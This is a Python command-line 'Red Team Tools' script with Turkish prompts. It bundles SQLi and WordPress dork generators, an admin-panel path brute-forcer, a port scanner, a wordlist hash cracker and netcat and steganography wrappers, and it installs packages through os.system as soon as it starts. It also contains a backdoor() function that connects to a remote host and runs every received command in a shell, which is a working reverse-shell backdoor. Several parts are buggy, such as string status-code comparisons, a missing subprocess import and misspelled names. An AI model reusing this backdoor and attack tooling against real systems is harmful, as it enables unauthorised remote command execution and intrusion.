#!/usr/bin/env python3
# -*- coding: utf-8  -*- 

"""
Telergam:Adanlitrojan
İnstagram: adanlitrojan
"""
__Version__ =  "0.1 (Orjinal Version)"
__Name__ = "Red Team Tools"
__Author__ = "Trojanx6"
__Code__ = "python3.10"
__Github__ = "https://github.com/trojanx6"
__Date__ = "21 - 8 - 2022"
__Team__ = "SiberAtay"
__License__ ="GNU General Public License V.3"
__disclaimer__ = "bu tool kullanımından kesinlikle sorumluluk kabul etmiyorum kullanan kisi yada kisilsr kendi adlarinca kullanmistir."

#########################  MODUL IMPORT #########################
try:
    import requests as req 
    import socket,sys,time,json,os,hashlib 
    import hashlib as hasher
    from dork import bypassdork , wordpressdork , fileuplouddork , sqldork 
except:
    print("İmport Ediliyor...")


            
def install():
    os.system("apt install netcat")
    os.system("apt-get install steghide -y")
    os.system("apt  install exiftool")
    os.system("apt-get install steghide -y")
    os.system(" apt-get install  stegcracker")
    os.system("pip install stegcracker")
    os.system("pip install json")
    os.system("pip install hashlib ")
    os.system("pip install requests")
    
    
    

if sys.platform  == "linux": #Kali linux systemp
    try:
        install()
    except:
        try:
            os.system("pip install --upgrade pip")
            install()
        except:
            print("O kadar kod yazdım zahmet edip manuel indire bilirsin")
  
        
        
elif sys.platform== "darwin": #macOS system
    try:
        install()
    except:
        try:
            os.system(r'curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py python get-pip.py')
            os.system("python -m pip install --upgrade pip")
            install()
        except:
            print("O kadar kod yazdım zahmet edip manuel indire bilirsin")
        
            
elif sys.platform== "win32": # windows system
    try:
        install()
    except:
        try:
            os.system('python -m pip install --upgrade pip')
            os.system("py -m pip install --upgrade pip")
            install()
        except:
            print("O kadar kod yazdım zahmet edip manuel indire bilirsin")
       
elif os.name == "posix": #Android
    try:
        install()
    except:
        try:
            os.system("pip install --upgrade pip")
            install()
        except:
            print("O kadar kod yazdım zahmet edip manuel indire bilirsin ")
                  
else:
    print("Bro sen hangi sistemi kullaniyorsun girsene kullandigin sistemi")
    
system = sys.platform
    
  
######################### SOURCE CODE #########################
    
    
print(f"""

ooooooooo.                   .o8       oooo         o8o      .   
`888   `Y88.                "888       `888         `"'    .o8   
 888   .d88'  .ooooo.   .oooo888        888  oooo  oooo  .o888oo 
 888ooo88P'  d88' `88b d88' `888        888 .8P'   `888    888   
 888`88b.    888ooo888 888   888        888888.     888    888   
 888  `88b.  888    .o 888   888        888 `88b.   888    888 . 
o888o  o888o `Y8bod8P' `Y8bod88P"      o888o o888o o888o   "888" 
                                                                 
system:{system}                                                              
disclainer:{__disclaimer__ }         

                                                                                              
[ + ] {1} SQLi Dork Maker
[ + ] {2} WordPress Dork Maker
[ + ] {3} Admin Panel Scanner
[ + ] {4} Advanced Port Scanner
[ + ] {5} Hash Identifier
[ + ] {6} Some Cryptography Tools 
[ + ] {7} Netcat Listener for Reverse Shells
[ + ] {8} Steghide ( Stenography ) 
[ + ] {9} Stegcracker 
[ + ] {10} Exiftool ( metada analyzer ) 
[ + ] {11} Trojan Creator 
[ + ] {12} Web Application Firewall Detecter
[ + ] {13} Exploit Database Researcher 
[ + ] {14} John the Ripper ( for hash cracking)  

""")

def backdoor(): # Ek olarak Yerleştirdim kullanmak isteyen kullanır.
    server_ip = input("target(127.0.0.1): ")
    port = int(input("Hedef port: "))
    
    backdoor = socket.socket()
    backdoor.connect((server_ip, port))

    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output + output_error)

islem = int(input("[ + ] islem giriniz: "))
def admin_panel():
    print("""
          .o.             .o8                     o8o                   oooooooooooo  o8o                    .o8                     
     .888.           "888                     `"'                   `888'     `8  `"'                   "888                     
    .8"888.      .oooo888  ooo. .oo.  .oo.   oooo  ooo. .oo.         888         oooo  ooo. .oo.    .oooo888   .ooooo.  oooo d8b 
   .8' `888.    d88' `888  `888P"Y88bP"Y88b  `888  `888P"Y88b        888oooo8    `888  `888P"Y88b  d88' `888  d88' `88b `888""8P 
  .88ooo8888.   888   888   888   888   888   888   888   888        888    "     888   888   888  888   888  888ooo888  888     
 .8'     `888.  888   888   888   888   888   888   888   888        888          888   888   888  888   888  888    .o  888     
o88o     o8888o `Y8bod88P" o888o o888o o888o o888o o888o o888o      o888o        o888o o888o o888o `Y8bod88P" `Y8bod8P' d888b    
                                                                                                                                 
                                                                                                                                 
                                                                                                                                 
    """)
    target = str(input("Hedef adresi giriniz: "))
    istek = req.get("https://"+target)
    if istek.status_code != "404":
        istek = req.get('https://'+target)
        with open("wordlist.txt","r+") as f:
              for i in f.readlines():
                  istek_1 = req.get("https://" +target + '/' + i )
                  if istek_1.status_code == "200":
                     print("Found:","https://" +target + '/' + i)
                  else:
                     print("Not found:",i)
    else:
        istek = req.get("http://"+target)
        with open("wordlist.txt","r+") as f:
              for i in f.readlines():
                  istek_1 = req.get("http://"+target + '/' + i)
                  if istek_1.status_code == "200":
                     print("Found:","http://" +target + '/' + i)
                  else:
                      print("Not Found:",i)
                      
                      
                      
                      
                      
def port_scaner():
    print('''
    ._______ ._______  .______  _____._     .________._______ .______  .______  ._______.______  
: ____  |: .___  \ : __   \ \__ _:|     |    ___/:_.  ___\:      \ :      \ : .____/: __   \ 
|    :  || :   |  ||  \____|  |  :|     |___    \|  : |/\ |   .   ||       || : _/\ |  \____|
|   |___||     :  ||   :  \   |   |     |       /|    /  \|   :   ||   |   ||   /  \|   :  \ 
|___|     \_. ___/ |   |___\  |   |     |__:___/ |. _____/|___|   ||___|   ||_.: __/|   |___\
            :/     |___|      |___|        :      :/          |___|    |___|   :/   |___|    
            :                                     :                                          
                                                                                             
                                                                                             
    
    ''')
    target = input("target: ")
    print("-"*40)
    try:
        for port in range(1,65535):
            soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            cevap = soc.connect_ex((target,port))
            if cevap == 0:
               print(f"[ + ] port {port} is open")
            
            
    except KeybroadInterrupt:
        print("çıkış yapildi")
        sys.exit()
        
        
        
def hash_info():
    print = ("""
    H)    hh                 h)         ##          f)FFF         
H)    hh                 h)                    f)             
H)hhhhhh a)AAAA   s)SSSS h)HHHH     i) n)NNNN  f)FFF   o)OOO  
H)    hh  a)AAA  s)SSSS  h)   HH    i) n)   NN f)     o)   OO 
H)    hh a)   A       s) h)   HH    i) n)   NN f)     o)   OO 
H)    hh  a)AAAA s)SSSS  h)   HH    i) n)   NN f)      o)OOO  
                                                              
                                                              
    """)
    hash = str(input("Hash giriniz: "))
    hs1 ='4607'
    if len(hash)==len(hs1) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type, CRC16 ")       
        
        
    hs2 ='3d08'
    if len(hash) == len(hs2) and hash.isdigit() == False and hash.isalpha()==False and hash.isalnum()==True:
       print("Hash type, CRC16CİTT ")    
         
         
    hs3 ='0e5b'
    if len(hash)==len(hs3) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type FCS16 ")
    
    
    hs4 ='b33fd057'
    if len(hash)==len(hs4) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type CRC 32 ")
        
    hs5 ='b764a0d9'
    if len(hash)==len(hs5) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type CRC32C ")
    
    hs6 ='0000003f'
    if  len(hash)==len(hs6) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type XOR32")
        
    hs7 ='63cea4673fd25f46'
    if len(hash)==len(hs7) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type MySQL")
    
    hs8 ='08bbef4754d98806c373f2cd7d9a43c4'
    if len(hash)==len(hs8) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type MD2 ")
    hs9 ='a2acde400e61410e79dacbdfc3413151'
    if len(hash)==len(hs9) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("hash type  ")
    hs10='ae11fd697ec92c7c98de3fac23aba525'
    if len(hash)==len(hs10) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
        print("Hash type MD5")
        
        
    hs11 ='4a1d4dbc1e193ec3ab2e9213876ceb8f4db72333'
    if len(hash) == len(hs11) and hash.isdigit() == False  and hash.isalpha() == False  and hash.isalnum()==True:
        print("Hash type Sha1  ")
        
    hs12 ='2c740d20dab7f14ec30510a11f8fd78b82bc3a711abe8a993acdb323e78e6d5e'
    if len(hash) == len(hs12) and hash.isdigit() == False  and hash.isalpha() == False  and hash.isalnum()==True:
       print("Hash type sha256 ")
       
    hs13 ='e301f414993d5ec2bd1d780688d37fe41512f8b57f6923d054ef8e59'
    if len(hash) == len(hs13) and hash.isdigit() == False  and hash.isalpha() == False  and hash.isalnum()==True:
        print("Hash type sha224 ")
       
    hs14 ='7169ecae19a5cd729f6e9574228b8b3c91699175324e6222dec569d4281d4a4a'
    if len(hash) == len(hs14)  and  hash.isdigit() == False  and  hash.isalpha() == False and hash.isalnum() == True:
        print("Hash type Haval256 ")
     
    hs16='sha256$Zion3R$9e1a08aa28a22dfff722fad7517bae68a55444bb5e2f909d340767cec9acf2c3'
    if len(hash) == len(hs16) and hash.isdigit() == False  and  hash.isalpha() == False  and hash.isalnum() == True:
        print("Hash type sha1django ")
        
    hs17 ='ea8e6f0935b34e2e6573b89c0856c81b831ef2cadfdee9f44eb9aa0955155ba5e8dd97f85c73f030666846773c91404fb0e12fb38936c56f8cf38a33ac89a24e'
    if len(hash) == len(hs17) and hash.isdigit() == False and hash.isalpha() == False  and  hash.isalnum()==True:
        print("Hash type sha512 ")
    hs18 ='76df96157e632410998ad7f823d82930f79a96578acc8ac5ce1bfc34346cf64b4610aefa8a549da3f0c1da36dad314927cebf8ca6f3fcd0649d363c5a370dddb'
    if len(hash)==len(hs18) and hash.isdigit() == False  and  hash.isalpha() == False  and  hash.isalnum() == True:
       print("Hash type Whirlpool")
       
def sql_dork():
   print("""
  
.d88888b   .88888.   dP                                                            
88.    "' d8'   `8b  88                                                            
`Y88888b. 88     88  88                                                            
      `8b 88  db 88  88                                                            
d8'   .8P Y8.  Y88P  88                                                            
 Y88888P   `8888PY8b 88888888P                                                     
                                                                                   
                                                                                   
            888888ba   .88888.   888888ba  dP     dP                               
            88    `8b d8'   `8b  88    `8b 88   .d8'                               
            88     88 88     88 a88aaaa8P' 88aaa8P'                                
            88     88 88     88  88   `8b. 88   `8b.                               
            88    .8P Y8.   .8P  88     88 88     88                               
            8888888P   `8888P'   dP     dP dP     dP                               
                                                                                   
                                                                                   
                           8888ba.88ba   .d888888  dP     dP  88888888b  888888ba  
                           88  `8b  `8b d8'    88  88   .d8'  88         88    `8b 
                           88   88   88 88aaaaa88a 88aaa8P'  a88aaaa    a88aaaa8P' 
                           88   88   88 88     88  88   `8b.  88         88   `8b. 
                           88   88   88 88     88  88     88  88         88     88 
                           dP   dP   dP 88     88  dP     dP  88888888P  dP     dP 
   """)
   while True:
      try:
         url = input("Enter a country's domain extension:\033[0m ")
         if not url:
            raise ValueError 

         f = open("Latest Dorks.txt", "w+", encoding='utf8')
         countrydomain = sqldork.replace("countrydomain","site" + url)
         f.write(countrydomain)

         print("Dorks saved to \"Latest Dorks.txt\"")
         done = input("Press \"Enter\" to exit")
         sys.exit()

      except ValueError:
            print("\033[91mError: Please enter a valid domain extension!")

def wordpress():
    print("""
                                                                                                                                                               
`8.`888b                 ,8'  ,o888888o.     8 888888888o.   8 888888888o.      8 888888888o   8 888888888o.   8 8888888888     d888888o.      d888888o.                                                                                                                                 
 `8.`888b               ,8'. 8888     `88.   8 8888    `88.  8 8888    `^888.   8 8888    `88. 8 8888    `88.  8 8888         .`8888:' `88.  .`8888:' `88.                                                                                                                               
  `8.`888b             ,8',8 8888       `8b  8 8888     `88  8 8888        `88. 8 8888     `88 8 8888     `88  8 8888         8.`8888.   Y8  8.`8888.   Y8                                                                                                                               
   `8.`888b     .b    ,8' 88 8888        `8b 8 8888     ,88  8 8888         `88 8 8888     ,88 8 8888     ,88  8 8888         `8.`8888.      `8.`8888.                                                                                                                                   
    `8.`888b    88b  ,8'  88 8888         88 8 8888.   ,88'  8 8888          88 8 8888.   ,88' 8 8888.   ,88'  8 888888888888  `8.`8888.      `8.`8888.                                                                                                                                  
     `8.`888b .`888b,8'   88 8888         88 8 888888888P'   8 8888          88 8 888888888P'  8 888888888P'   8 8888           `8.`8888.      `8.`8888.                                                                                                                                 
      `8.`888b8.`8888'    88 8888        ,8P 8 8888`8b       8 8888         ,88 8 8888         8 8888`8b       8 8888            `8.`8888.      `8.`8888.                                                                                                                                
       `8.`888`8.`88'     `8 8888       ,8P  8 8888 `8b.     8 8888        ,88' 8 8888         8 8888 `8b.     8 8888        8b   `8.`8888. 8b   `8.`8888.                                                                                                                               
        `8.`8' `8,`'       ` 8888     ,88'   8 8888   `8b.   8 8888    ,o88P'   8 8888         8 8888   `8b.   8 8888        `8b.  ;8.`8888 `8b.  ;8.`8888                                                                                                                               
         `8.`   `8'           `8888888P'     8 8888     `88. 8 888888888P'      8 8888         8 8888     `88. 8 888888888888 `Y8888P ,88P'  `Y8888P ,88P'                                                                                                                               
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                              .         .                                                                                
                                                                                                    8 888888888o.          ,o888888o.     8 888888888o.   8 8888     ,88'                    ,8.       ,8.                   .8.          8 8888     ,88' 8 8888888888   8 888888888o.   
                                                                                                    8 8888    `^888.    . 8888     `88.   8 8888    `88.  8 8888    ,88'                    ,888.     ,888.                 .888.         8 8888    ,88'  8 8888         8 8888    `88.  
                                                                                                    8 8888        `88. ,8 8888       `8b  8 8888     `88  8 8888   ,88'                    .`8888.   .`8888.               :88888.        8 8888   ,88'   8 8888         8 8888     `88  
                                                                                                    8 8888         `88 88 8888        `8b 8 8888     ,88  8 8888  ,88'                    ,8.`8888. ,8.`8888.             . `88888.       8 8888  ,88'    8 8888         8 8888     ,88  
                                                                                                    8 8888          88 88 8888         88 8 8888.   ,88'  8 8888 ,88'                    ,8'8.`8888,8^8.`8888.           .8. `88888.      8 8888 ,88'     8 888888888888 8 8888.   ,88'  
                                                                                                    8 8888          88 88 8888         88 8 888888888P'   8 8888 88'                    ,8' `8.`8888' `8.`8888.         .8`8. `88888.     8 8888 88'      8 8888         8 888888888P'   
                                                                                                    8 8888         ,88 88 8888        ,8P 8 8888`8b       8 888888<                    ,8'   `8.`88'   `8.`8888.       .8' `8. `88888.    8 888888<       8 8888         8 8888`8b       
                                                                                                    8 8888        ,88' `8 8888       ,8P  8 8888 `8b.     8 8888 `Y8.                 ,8'     `8.`'     `8.`8888.     .8'   `8. `88888.   8 8888 `Y8.     8 8888         8 8888 `8b.     
                                                                                                    8 8888    ,o88P'    ` 8888     ,88'   8 8888   `8b.   8 8888   `Y8.              ,8'       `8        `8.`8888.   .888888888. `88888.  8 8888   `Y8.   8 8888         8 8888   `8b.   
                                                                                                    8 888888888P'          `8888888P'     8 8888     `88. 8 8888     `Y8.
    """)
    while True:
      try:
         url = input("\033[96mEnter a country's domain extension:\033[0m ")
         if not url:
            raise ValueError # raises an error if the input is left empty

         f = open("Latest Dorks.txt", "w+", encoding='utf8')
         countrydomain = wordpressdork.replace("countrydomain", "site:" + url)
         f.write(countrydomain)

         print("Dorks saved to \"Latest Dorks.txt\"")
         done = input("Press \"Enter\" to exit")
         sys.exit()

      except ValueError:
            print("\033[91mError: Please enter a valid domain extension!")

def wafw00f():
     os.system("wafw00f -l")
     target = input('hedef adres: ')
     os.system(f"wafw00f {target} -v ")
     


    
def crypto():
    print("""
     ___  ___  ________  ________  ___  ___                                                                                                         
|\  \|\  \|\   __  \|\   ____\|\  \|\  \                                                                                                        
\ \  \\\  \ \  \|\  \ \  \___|\ \  \\\  \                                                                                                       
 \ \   __  \ \   __  \ \_____  \ \   __  \                                                                                                      
  \ \  \ \  \ \  \ \  \|____|\  \ \  \ \  \                                                                                                     
   \ \__\ \__\ \__\ \__\____\_\  \ \__\ \__\                                                                                                    
    \|__|\|__|\|__|\|__|\_________\|__|\|__|                                                                                                    
                       \|_________|                                                                                                             
                                                                                                                                                
                                                                                                                                                
                                      _______   ________   ________  ________      ___    ___ ________  _________  ___  ________  ________      
                                     |\  ___ \ |\   ___  \|\   ____\|\   __  \    |\  \  /  /|\   __  \|\___   ___\\  \|\   __  \|\   ___  \    
                                     \ \   __/|\ \  \\ \  \ \  \___|\ \  \|\  \   \ \  \/  / | \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \   
                                      \ \  \_|/_\ \  \\ \  \ \  \    \ \   _  _\   \ \    / / \ \   ____\   \ \  \ \ \  \ \  \\\  \ \  \\ \  \  
                                       \ \  \_|\ \ \  \\ \  \ \  \____\ \  \\  \|   \/  /  /   \ \  \___|    \ \  \ \ \  \ \  \\\  \ \  \\ \  \ 
                                        \ \_______\ \__\\ \__\ \_______\ \__\\ _\ __/  / /      \ \__\        \ \__\ \ \__\ \_______\ \__\\ \__\
                                         \|_______|\|__| \|__|\|_______|\|__|\|__|\___/ /        \|__|         \|__|  \|__|\|_______|\|__| \|__|
                                                                                 \|___|/                                                        
                                                                                                                                                

    
    
    """)
    print(""" 
şifreleme türü seçiniz
[1] md5                 
[2] sha1                       
[3] sha224      
[4] sha256      
[5] sha384      
[6] sha3_256      
[7] sha3_384      
[8] sha3_512      
[9] sha512            
   """)
    print(time.asctime())
    secim = int(input("işlem kodu girini: "))
    if secim == 1:
       metin = input('metin giriniz: ')
       sifre = hasher.md5()
       sifre.update(metin.encode('utf-8'))
       hash = sifre.hexdigest()
       print(hash)

    elif secim == 2:
       l = input("metin geriniz: ")
       time.sleep(1)
       pw = hasher.sha1()
       pw.update(l.encode("utf-8"))
       w = pw.hexdigest()
       print(w)
  
    elif secim == 3:
    	zor = input("metin giriniz: ")
    	zor_be = hasher.sha224()
    	zor_be.update(zor.encode('utf-8'))
    	zor_be_ya = zor_be.hexdigest()
    	print(zor_be_ya)
	
    elif secim == 4:
        qq = hasher.sha256()
        print(__z := input('metin giriniz: '))
        qq.update(__z.encode('utf-8'))
        q_q = qq.hexdigest()
        print(q_q)
        
    elif secim == 5:
        o = input('metin giriniz: ')
        time.sleep(1)
        q__w = hasher.sha384()
        q__w.update(o.encode('utf-8'))
        asasd = q__w.hexdigest()
        print(asasd)
        
    elif secim == 6:
        m1 = input("metin giriniz: ")
        m2 = hasher.sha3_256()
        m2.update(m1.encode("utf-8"))
        m3 = m2.hexdigest()
        print(m3)
        
    elif secim == 7:
        j1 = input("metin giriniz: ")
        j2 = hasher.sha3_384()
        j2.update(j1.encode("utf-8"))
        j3 = j2.hexdigest()
        print(j3)
	
    elif secim == 8:
        print(e1 := input("metin giriniz: "))
        e2 = hasher.sha3_512()
        e2.update(e1.encode("utf-8"))
        e3 = e2.hexdigest()
        print(e3)
	
    elif secim == 9:
	    x1 = input("metin giriniz: ")
	    time.sleep(1)
	    x2 = hasher.sha512()
	    x2.update(x1.encode("utf-8"))
	    x3 = x2.hexdigest()
	    print(x3)
	
    else:
   	 print("yanlîş kod yazdınız")
   	 
def hash_c():
    print("""
     ___  ___  ________  ________  ___  ___          ___  ________   ________ ________     
|\  \|\  \|\   __  \|\   ____\|\  \|\  \        |\  \|\   ___  \|\  _____\\   __  \    
\ \  \\\  \ \  \|\  \ \  \___|\ \  \\\  \       \ \  \ \  \\ \  \ \  \__/\ \  \|\  \   
 \ \   __  \ \   __  \ \_____  \ \   __  \       \ \  \ \  \\ \  \ \   __\\ \  \\\  \  
  \ \  \ \  \ \  \ \  \|____|\  \ \  \ \  \       \ \  \ \  \\ \  \ \  \_| \ \  \\\  \ 
   \ \__\ \__\ \__\ \__\____\_\  \ \__\ \__\       \ \__\ \__\\ \__\ \__\   \ \_______\
    \|__|\|__|\|__|\|__|\_________\|__|\|__|        \|__|\|__| \|__|\|__|    \|_______|
                       \|_________|                                                    
                                                                                       

    """ )
    #'sha1', 'sha224', 'sha256', 'sha384', 'sha3_224', 'sha3_256', 'sha3_384', 'sha3_512', 'sha512', 
    print("""
 [ 1 ] md5 
 [ 2 ] sha1
 [ 3 ] sha256
 [ 4 ] sha224
 [ 5 ] sha384
 [ 6 ] sha512
 [ 7 ] sha3_256
 [ 8 ] sha3_384
    
    
    """)
    islem = int(input("işlem numrasi giriniz (type): "))
    hash_ = input("hash giriniz: ")
    
    
    def md5_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.md5(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha1_c():
      
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha1(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
     
    def sha256_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha256(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha224_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha224(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha384_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha384(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha512_c():
         
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha512(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha3_256c():         
         with open("wordlist.txt", "r", encoding="utf-8") as password :
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha3_256(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       
                       
    def sha3_384c():
         with open("wordlist.txt", "r", encoding="utf-8") as password:
                data = password.readlines()
                for i in data:
                    hash_decode = hashlib.sha3_384(i.strip().encode('utf-8')).hexdigest()
                    if hash_decode == hash_:
                       print(f"[ + ] Found {i.strip()}")
                       exit()
                       
                       

    if islem == 1:
       md5_c()
    elif islem == 2:
        sha1_c()
    elif islem == 3:
        sha256_c()
    elif islem == 4:
        sha224_c()
    elif islem == 5:
        sha384_c()
    elif islem == 6:
       sha512_c()
    elif islem == 7:
       sha3_256c()
    elif islem == 8:
       sha3_384c()
    else:
        print("hatali kod")
def extiftool():
   print("""
                                                                                                                                                
EEEEEEEEEEEEEEEEEEEEEE                      iiii     ffffffffffffffff           tttt                                            lllllll      
E::::::::::::::::::::E                     i::::i   f::::::::::::::::f       ttt:::t                                            l:::::l      
E::::::::::::::::::::E                      iiii   f::::::::::::::::::f      t:::::t                                            l:::::l      
EE::::::EEEEEEEEE::::E                             f::::::fffffff:::::f      t:::::t                                            l:::::l      
  E:::::E       EEEEEExxxxxxx      xxxxxxxiiiiiii  f:::::f       ffffffttttttt:::::ttttttt       ooooooooooo      ooooooooooo    l::::l      
  E:::::E              x:::::x    x:::::x i:::::i  f:::::f             t:::::::::::::::::t     oo:::::::::::oo  oo:::::::::::oo  l::::l      
  E::::::EEEEEEEEEE     x:::::x  x:::::x   i::::i f:::::::ffffff       t:::::::::::::::::t    o:::::::::::::::oo:::::::::::::::o l::::l      
  E:::::::::::::::E      x:::::xx:::::x    i::::i f::::::::::::f       tttttt:::::::tttttt    o:::::ooooo:::::oo:::::ooooo:::::o l::::l      
  E:::::::::::::::E       x::::::::::x     i::::i f::::::::::::f             t:::::t          o::::o     o::::oo::::o     o::::o l::::l      
  E::::::EEEEEEEEEE        x::::::::x      i::::i f:::::::ffffff             t:::::t          o::::o     o::::oo::::o     o::::o l::::l      
  E:::::E                  x::::::::x      i::::i  f:::::f                   t:::::t          o::::o     o::::oo::::o     o::::o l::::l      
  E:::::E       EEEEEE    x::::::::::x     i::::i  f:::::f                   t:::::t    tttttto::::o     o::::oo::::o     o::::o l::::l      
EE::::::EEEEEEEE:::::E   x:::::xx:::::x   i::::::if:::::::f                  t::::::tttt:::::to:::::ooooo:::::oo:::::ooooo:::::ol::::::l     
E::::::::::::::::::::E  x:::::x  x:::::x  i::::::if:::::::f                  tt::::::::::::::to:::::::::::::::oo:::::::::::::::ol::::::l     
E::::::::::::::::::::E x:::::x    x:::::x i::::::if:::::::f                    tt:::::::::::tt oo:::::::::::oo  oo:::::::::::oo l::::::l     
EEEEEEEEEEEEEEEEEEEEEExxxxxxx      xxxxxxxiiiiiiiifffffffff                      ttttttttttt     ooooooooooo      ooooooooooo   llllllll     
                                                         
   """)
   file = input("dosya giriniz: ")
   os.system(f"extiftool {file}")
   
def netcat():
      try:
          print("""                                                                     
  L.                     ,;               .,                        
  EW:        ,ft       f#i               ,Wt                        
  E##;       t#E     .E#t  GEEEEEEEL    i#D.            .. GEEEEEEEL
  E###t      t#E    i#W,   ,;;L#K;;.   f#f             ;W, ,;;L#K;;.
  E#fE#f     t#E   L#D.       t#E    .D#i             j##,    t#E   
  E#t D#G    t#E :K#Wfff;     t#E   :KW,             G###,    t#E   
  E#t  f#E.  t#E i##WLLLLt    t#E   t#f            :E####,    t#E   
  E#t   t#K: t#E  .E#L        t#E    ;#G          ;W#DG##,    t#E   
  E#t    ;#W,t#E    f#E:      t#E     :KE.       j###DW##,    t#E   
  E#t     :K#D#E     ,WW;     t#E      .DW:     G##i,,G##,    t#E   
  E#t      .E##E      .D#;    t#E        L#,  :K#K:   L##,    t#E   
  ..         G#E        tt     fE         jt ;##D.    L##,     fE   
              fE                :            ,,,      .,,       :   
               ,                                                    
          """)
          target_ = input("hedef kurban: ")
          portu = input('kurban portu: ')
          os.system(f"nc -nv {target_} {portu}")
          

      except TimeoutError:
          print("baglanti zaman asimina ugradi")

def steg():
   print("""

           dP                                                                  dP                
           88                                                                  88                
.d8888b. d8888P .d8888b. 88d888b. .d8888b. .d8888b. 88d888b. .d8888b. 88d888b. 88d888b. dP    dP 
Y8ooooo.   88   88ooood8 88'  `88 88'  `88 88'  `88 88'  `88 88'  `88 88'  `88 88'  `88 88    88 
      88   88   88.  ... 88    88 88.  .88 88.  .88 88       88.  .88 88.  .88 88    88 88.  .88 
`88888P'   dP   `88888P' dP    dP `88888P' `8888P88 dP       `88888P8 88Y888P' dP    dP `8888P88 
                                                .88                   88                     .88 
                                            d8888P                    dP                 d8888P
   (Başlamadan Önce stegcracker indiriniz*)                                           
   """)
   file = input("taranacak dosya: ")
   os.system(f"stegcracker {file}")


def stengraf():
    print("""
                                                                              
.s5SSSs.  .s5SSSSs. .s5SSSs.  .s5SSSs.  .s    s.  s.  .s5SSSs.  .s5SSSs.  
      SS.    SSS          SS.       SS.       SS. SS.       SS.       SS. 
sS    `:;    S%S    sS    `:; sS    `:; sS    S%S S%S sS    S%S sS    `:; 
`:;;;;.      S%S    SSSs.     SS        SSSs. S%S S%S SS    S%S SSSs.     
      ;;.    S%S    SS        SS        SS    S%S S%S SS    S%S SS        
      `:;    `:;    SS        SS   ``:; SS    `:; `:; SS    `:; SS        
.,;   ;,.    ;,.    SS    ;,. SS    ;,. SS    ;,. ;,. SS    ;,. SS    ;,. 
`:;;;;;:'    ;:'    `:;;;;;:' `:;;;;;:' :;    ;:' ;:' ;;;;;;;:' `:;;;;;:' 

    
    """)
    os.system("steghide")
 
if islem == 1:
    sql_dork()
elif islem == 2:
    wordpress()
elif islem == 3:
    admin_panel()
elif islem == 4:
    port_scaner()
elif islem == 5:
    hash_info()
elif islem == 6:
    crypto()
elif islem == 7:
    netcat()
elif islem == 8:
    stengraf()
elif islem == 9:
    steg()
elif islem == 10:
    extiftool()
elif islem == 11:
    pass
elif islem == 12:
    wafw00f()
elif islem == 13:
    pass
elif islem == 14:
    hash_c()
else:
    print("hatali kod girdiniz ! ")